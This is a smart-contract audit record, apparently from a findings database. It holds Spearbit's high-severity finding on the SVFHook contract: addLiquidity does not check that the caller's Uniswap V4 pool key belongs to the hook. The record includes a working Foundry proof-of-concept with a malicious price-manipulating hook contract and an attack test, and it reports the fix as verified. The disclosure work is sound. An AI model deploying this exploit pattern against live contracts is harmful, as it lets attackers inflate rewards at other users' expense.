{
    "id": 62647,
    "kind": "PDF",
    "auditfirm_id": 6,
    "impact": "HIGH",
    "finders_count": 3,
    "protocol_id": 3430,
    "title": "Chat points manipulation by adding liquidity to custom pools via SVFHook contract",
    "content": "## High Risk Report\n\n**Severity:** High Risk\n\n**Context:** (No context files were provided by the reviewer)\n\n## Description\n\nThe `addLiquidity` function of the `SVFHook` contract is intended for users to increase their available chat points by depositing liquidity (WETH/SVF) into a Uniswap V4 pool. The function allows callers to specify the key of the pool they add liquidity to using the `key` parameter. \n\nHowever, the function does not enforce that the given pool key is indeed associated with the `SVFHook` contract. This allows adding liquidity to other Uniswap V4 pools that trade the same tokens via `SVFHook::addLiquidity`. This can result in users abusing this functionality by deploying their custom pools with malicious hooks attached, adding liquidity to their own pools, and still increasing their chat points in the system at lower costs than if they did it via other means.\n\n### Possible Attack Vector\n\n1. Attacker deploys a malicious hook that is able to alter liquidity before and after itâ€™s added to a pool (that is, setting hook flags `BEFORE_ADD_LIQUIDITY_FLAG`, `AFTER_ADD_LIQUIDITY_FLAG`, and `AFTER_ADD_LIQUIDITY_RETURNS_DELTA_FLAG`).\n2. Attacker deploys a custom Uniswap V4 pool to trade SVF / WETH, attaching the hook deployed in (1).\n3. In `addLiquidity`, the liquidity to mint is based on the price at the beginning of the execution. This means the attacker can now leverage their hooks to freely alter the actual price at which liquidity is added (different from the initial price queried by the system), and get chat points at lower costs than expected.\n4. Because the attacker managed to alter the price at will to benefit their position, they can take advantage of the refunds from the `SVFHook` to recover part of the actual assets provided at first.\n\n## Proof of Concept\n\nIn the `test_spearbit_addLiquidityCustomPoolWithHook` function below, we've developed a test case building upon the test scenarios available in `SVFHook.t.sol`, which showcases one possible case of exploiting the vulnerability described.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.26;\n\nimport \"forge-std/Test.sol\";\nimport {IHooks} from \"v4-core/src/interfaces/IHooks.sol\";\nimport {Hooks} from \"v4-core/src/libraries/Hooks.sol\";\nimport {TickMath} from \"v4-core/src/libraries/TickMath.sol\";\nimport {SqrtPriceMath} from \"v4-core/src/libraries/SqrtPriceMath.sol\";\nimport {IPoolManager} from \"v4-core/src/interfaces/IPoolManager.sol\";\nimport {PoolKey} from \"v4-core/src/types/PoolKey.sol\";\nimport {BalanceDelta} from \"v4-core/src/types/BalanceDelta.sol\";\nimport {PoolId, PoolIdLibrary} from \"v4-core/src/types/PoolId.sol\";\nimport {CurrencyLibrary, Currency} from \"v4-core/src/types/Currency.sol\";\nimport {PoolSwapTest} from \"v4-core/src/test/PoolSwapTest.sol\";\nimport {StateLibrary} from \"v4-core/src/libraries/StateLibrary.sol\";\nimport {SafeCast} from \"v4-core/src/libraries/SafeCast.sol\";\nimport {LiquidityAmounts} from \"v4-core/test/utils/LiquidityAmounts.sol\";\nimport {IPositionManager} from \"v4-periphery/src/interfaces/IPositionManager.sol\";\nimport {EasyPosm} from \"./utils/EasyPosm.sol\";\nimport {Fixtures} from \"./utils/Fixtures.sol\";\nimport {ERC721, ERC721TokenReceiver} from \"solmate/src/tokens/ERC721.sol\";\nimport \"@uniswap/v4-core/test/utils/LiquidityAmounts.sol\";\nimport {MockERC20} from \"solmate/src/test/utils/mocks/MockERC20.sol\";\nimport \"../src/hook/SVFHook.sol\";\nimport \"../src/Master42.sol\";\nimport \"../src/SVFToken.sol\";\nimport \"../src/Warehouse13.sol\";\nimport \"../src/Vesting.sol\";\nimport {WETH} from \"solmate/src/tokens/WETH.sol\";\nimport {Upgrades} from \"openzeppelin-foundry-upgrades/Upgrades.sol\";\nimport {ERC1967Proxy} from \"@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol\";\nimport {BaseHook} from \"v4-periphery/src/utils/BaseHook.sol\";\nimport {BalanceDeltaLibrary} from \"v4-core/src/types/BalanceDelta.sol\";\nimport {toBalanceDelta} from \"v4-core/src/types/BalanceDelta.sol\";\nimport {Deployers} from \"v4-core/test/utils/Deployers.sol\";\n\n// The attacker's hook contract that will be attached to their custom Uniswap V4 pool\ncontract BadLiquidityHook is BaseHook {\n    uint160 public constant MIN_PRICE_LIMIT = TickMath.MIN_SQRT_PRICE + 1;\n    uint160 public constant MAX_PRICE_LIMIT = TickMath.MAX_SQRT_PRICE - 1;\n    BalanceDelta swapDelta;\n    bool hasLiquidity;\n\n    constructor(IPoolManager _manager) BaseHook(_manager) {}\n\n    function _beforeAddLiquidity(\n        address,\n        PoolKey calldata poolKey,\n        IPoolManager.ModifyLiquidityParams calldata,\n        bytes calldata\n    ) internal override returns (bytes4) {\n        if (hasLiquidity) {\n            bool zeroForOne = true;\n            swapDelta = poolManager.swap(\n                poolKey,\n                IPoolManager.SwapParams(\n                    zeroForOne, 100_000_000_000 ether, zeroForOne ? MIN_PRICE_LIMIT : MAX_PRICE_LIMIT\n                ),\n                bytes(\"\")\n            );\n        }\n        return IHooks.beforeAddLiquidity.selector;\n    }\n\n    function _afterAddLiquidity(\n        address sender,\n        PoolKey calldata key,\n        IPoolManager.ModifyLiquidityParams calldata params,\n        BalanceDelta delta,\n        BalanceDelta feesAccrued,\n        bytes calldata hookData\n    ) internal override returns (bytes4, BalanceDelta) {\n        if (hasLiquidity) {\n            bool zeroForOne = false;\n            swapDelta = poolManager.swap(\n                key,\n                IPoolManager.SwapParams(zeroForOne, swapDelta.amount1(), zeroForOne ? MIN_PRICE_LIMIT : MAX_PRICE_LIMIT),\n                bytes(\"\")\n            );\n        }\n        return (BaseHookUpgradeable.afterAddLiquidity.selector, toBalanceDelta(0, 0));\n    }\n\n    function getHookPermissions() public pure override returns (Hooks.Permissions memory) {\n        return Hooks.Permissions({\n            beforeInitialize: false,\n            afterInitialize: false,\n            beforeAddLiquidity: true,\n            afterAddLiquidity: true,\n            beforeRemoveLiquidity: false,\n            afterRemoveLiquidity: false,\n            beforeSwap: false,\n            afterSwap: false,\n            beforeDonate: false,\n            afterDonate: false,\n            beforeSwapReturnDelta: false,\n            afterSwapReturnDelta: false,\n            afterAddLiquidityReturnDelta: true,\n            afterRemoveLiquidityReturnDelta: false\n        });\n    }\n}\n\ncontract SVFHookTest is Test, Fixtures, ERC721TokenReceiver {\n    using SafeCast for int128;\n    using EasyPosm for IPositionManager;\n    using PoolIdLibrary for PoolKey;\n    using CurrencyLibrary for Currency;\n    using StateLibrary for IPoolManager;\n\n    uint256 constant MAX_DEADLINE = 12329839823;\n    uint160 SQRT_5000_1 = 5602277097478613991873193822745; // price = token1/token0 = 5000/1 = 5000\n    uint160 SQRT_2000_1 = 3543190000000000000000000000000; // price = token1/token0 = 2000/1 = 2000\n    uint160 SQRT_2100000_10 = 36306905189387912912677825629223;\n    uint256 internal ownerPrivateKey = 0xad111;\n    address internal owner = vm.addr(ownerPrivateKey);\n    uint256 internal aiPrivateKey = 0x0d3;\n    address internal ai = vm.addr(aiPrivateKey);\n    uint256 internal daoPrivateKey = 0xda0;\n    address internal dao = vm.addr(daoPrivateKey);\n    int24 MIN_TICK;\n    int24 MAX_TICK;\n    int24 constant MAX_TICK_SPACING = 32767;\n\n    SVFHook hook;\n    SVFToken svftoken;\n    Warehouse13 warehouse13;\n    Master42 master42;\n    Vesting vesting;\n    PoolId poolId;\n    Currency wethCurrency;\n    Currency svfCurrency;\n    uint256 svfTotalSupply = 42_000_000 ether;\n\n    function setUp() public {\n        vm.label(owner, \"owner\");\n        deployFreshManagerAndRouters();\n        // setup function calls\n        wethCurrency = deployMintAndApproveWETH();\n        svfCurrency = deployMintAndApproveSVF();\n\n        deployPosmWETH(manager);\n        approvePosmCurrency(wethCurrency);\n        approvePosmCurrency(svfCurrency);\n        \n        // Deploy warehouse13\n        address warehouse13Proxy = Upgrades.deployUUPSProxy(\n            \"out/Warehouse13.sol/Warehouse13.json\",\n            abi.encodeCall(Warehouse13.initialize, (address(svftoken), address(dao), address(ai)))\n        );\n        warehouse13 = Warehouse13(warehouse13Proxy);\n        vm.label(address(warehouse13), \"warehouse13\");\n\n        // Deploy vesting contract\n        uint256 vestingAmount = svfTotalSupply * 90 / 100;\n        vesting = new Vesting(address(svftoken), address(warehouse13), vestingAmount, block.timestamp);\n\n        // Deploy Master42\n        address master42Proxy = Upgrades.deployUUPSProxy(\n            \"out/Master42.sol/Master42.json\",\n            abi.encodeCall(Master42.initialize, (address(owner), address(ai), 10000000))\n        );\n        master42 = Master42(master42Proxy);\n        vm.label(address(master42), \"master42\");\n\n        // Mint tokens to provide liquidity\n        vm.prank(dao);\n        svftoken.mint();\n        vm.stopPrank();\n        console.log(\"svftoken total supply after mint\", svftoken.totalSupply());\n\n        // Transfer required SVF from DAO to test contract for initial liquidity\n        uint256 initialSvfLiquidityAmount = svfTotalSupply * 5 / 100;\n        vm.prank(dao);\n        svftoken.transfer(address(this), initialSvfLiquidityAmount);\n        vm.stopPrank();\n\n        // Transfer vesting amount from DAO to Vesting contract\n        vm.prank(dao);\n        svftoken.transfer(address(vesting), vestingAmount);\n        vm.stopPrank();\n\n        // Set vesting contract address in warehouse13\n        vm.startPrank(address(dao));\n        warehouse13.setVestingAddress(address(vesting));\n        vm.stopPrank();\n\n        // Deploy the hook\n        address flags = address(\n            uint160(Hooks.BEFORE_INITIALIZE_FLAG) ^ (0x4444 << 144)\n        );\n        SVFHook hookImpl = new SVFHook();\n\n        bytes memory initializerData = abi.encodeCall(\n            SVFHook.initialize, (address(owner), address(manager), payable(address(posm)), address(master42))\n        );\n        bytes memory constructorArgs = abi.encode(address(hookImpl), initializerData);\n        deployCodeTo(\"ERC1967Proxy.sol:ERC1967Proxy\", constructorArgs, flags);\n        hook = SVFHook(flags);\n        vm.label(address(hook), \"hook\");\n\n        svftoken.approve(address(hook), type(uint256).max);\n        weth.approve(address(hook), type(uint256).max);\n\n        // Whitelist token\n        vm.startPrank(owner);\n        hook.updateTokenWhitelists(Currency.unwrap(svfCurrency), true);\n        vm.stopPrank();\n\n        // Initialize a pool\n        PoolKey key = PoolKey(wethCurrency, svfCurrency, 10_000, 3000, IHooks(address(hook)));\n        poolId = key.toId();\n        manager.initialize(key, SQRT_2100000_10);\n\n        // Update the SVFHook address\n        vm.startPrank(owner);\n        master42.setHookAddressAndPoolId(address(hook), key.toId());\n        vm.stopPrank();\n\n        // Add initial liquidity\n        MIN_TICK = TickMath.minUsableTick(key.tickSpacing);\n        MAX_TICK = TickMath.maxUsableTick(key.tickSpacing);\n    }\n\n    // ... Additional code for liquidity setup and testing\n}\n\nfunction test_spearbit_addLiquidityCustomPoolWithHook() public {\n    address attacker = makeAddr(\"attacker\");\n\n    // Prepare mock calls and initial tests\n    uint128 liquidity = 10;\n    vm.mockCall(\n        address(hook),\n        abi.encodeWithSelector(ISVFHook.totalLockedFullRangeLiquidity.selector, PoolId.unwrap(master42.poolId())),\n        abi.encode(liquidity)\n    );\n\n    address flags = address(\n        uint160(\n            type(uint160).max & clearAllHookPermissionsMask | Hooks.AFTER_ADD_LIQUIDITY_FLAG\n            | Hooks.BEFORE_ADD_LIQUIDITY_FLAG | Hooks.AFTER_ADD_LIQUIDITY_RETURNS_DELTA_FLAG\n        )\n    );\n    deployCodeTo(\"MaliciousHook.t.sol:BadLiquidityHook\", abi.encode(manager), flags);\n\n    PoolKey memory attackerPoolKey = PoolKey({currency0: wethCurrency, currency1: svfCurrency, fee: 0, tickSpacing: 3000, hooks: IHooks(flags)});\n    assertNotEq(PoolId.unwrap(attackerPoolKey.toId()), PoolId.unwrap(master42.poolId()));\n\n    vm.startPrank(attacker);\n    manager.initialize(attackerPoolKey, SQRT_2100000_10);\n    deal(address(svftoken), attacker, 1e18);\n    deal(address(weth), attacker, 1e18);\n\n    svftoken.approve(address(hook), type(uint256).max);\n    weth.approve(address(hook), type(uint256).max);\n\n    // Needs some initial liquidity\n    (uint256 uniNFTId,,) = hook.addLiquidity(\n        attackerPoolKey,\n        SVFHook.AddLiquidityParams({amount0Desired: 1e18, amount1Desired: 1e18, deadline: MAX_DEADLINE})\n    );\n\n    // Attack to trigger the second addLiquidity call\n    uint256 amt0 = 5 ether;\n    uint256 amt1 = 5 ether;\n    deal(address(svftoken), attacker, amt0);\n    deal(address(weth), attacker, amt1);\n\n    // Add liquidity to the attacker's pool via the hook's addLiquidity function\n    (uniNFTId,,) = hook.addLiquidity(\n        attackerPoolKey,\n        SVFHook.AddLiquidityParams({amount0Desired: amt0, amount1Desired: amt1, deadline: MAX_DEADLINE})\n    );\n\n    // Validate that the attacker is in a favorable position\n    bytes32 positionKey = calculatePositionKey(address(posm), MIN_TICK, MAX_TICK, bytes32(uniNFTId));\n    uint128 actualLiquidity = manager.getPositionLiquidity(attackerPoolKey.toId(), positionKey);\n    \n    // Assert that the conditions from the attack were successful\n    assertEq(hook.balanceOf(attacker), 2);\n    \n    (uint256 amount, uint256 pointsDebt) = master42.userInfo(0, attacker);\n    assertGt(amount, 0);\n    assertEq(pointsDebt, 0);\n    \n    vm.warp(1 days);\n    \n    // Ensure attacker now has chat points available\n    assertGt(master42.availablePoints(attacker), 0);\n    vm.stopPrank();\n}\n\n// [...]\n\n```\n\n## Recommendation\n\nValidate that the user-controlled keys passed as parameters to the functions in `SVFHook` are correctly validated, ensuring they correspond to the expected Uniswap V4 pools that use the `SVFHook` contract.\n\n**Semantic Layer:** Fixed in PR 5.\n\n**Spearbit:** Fix verified.",
    "summary": "\nThe SVFHook contract has a function called `addLiquidity` that allows users to increase their chat points by depositing liquidity into a Uniswap V4 pool. However, this function does not check if the pool key provided is associated with the SVFHook contract, allowing users to add liquidity to other Uniswap V4 pools and exploit the system. This can be done by deploying a malicious hook and a custom Uniswap V4 pool, altering the price and taking advantage of refunds. The recommendation is to validate the keys passed to the functions to prevent this exploit. ",
    "report_date": "2025-07-27T00:00:00.000Z",
    "contest_prize_txt": "",
    "contest_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Semantic-Layer-Spearbit-Security-Review-May-2025.pdf",
    "sponsor_name": null,
    "sponsor_link": "",
    "quality_score": 0,
    "general_score": 0,
    "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Semantic-Layer-Spearbit-Security-Review-May-2025.pdf",
    "github_link": "",
    "pdf_link": "https://solodit-bucket.s3.amazonaws.com/storage/reports/spearbit/Semantic-Layer-Spearbit-Security-Review-May-2025.pdf",
    "pdf_page_from": 5,
    "contest_id": "",
    "slug": "chat-points-manipulation-by-adding-liquidity-to-custom-pools-via-svfhook-contract-spearbit-none-semantic-layer-pdf",
    "firm_name": "Spearbit",
    "firm_logo_square": "spearbit_square.png",
    "protocol_name": "Semantic Layer",
    "bookmarked": false,
    "read": false,
    "issues_issue_finders": [
        {
            "wardens_warden": {
                "handle": "Tnch"
            }
        },
        {
            "wardens_warden": {
                "handle": "Mario Poneder"
            }
        },
        {
            "wardens_warden": {
                "handle": "Noah Marconi"
            }
        }
    ],
    "auditfirms_auditfirm": {
        "name": "Spearbit",
        "logo_square": "spearbit_square.png"
    },
    "protocols_protocol": {
        "name": "Semantic Layer",
        "protocols_protocolcategoryscore": []
    },
    "issues_issuetagscore": []
}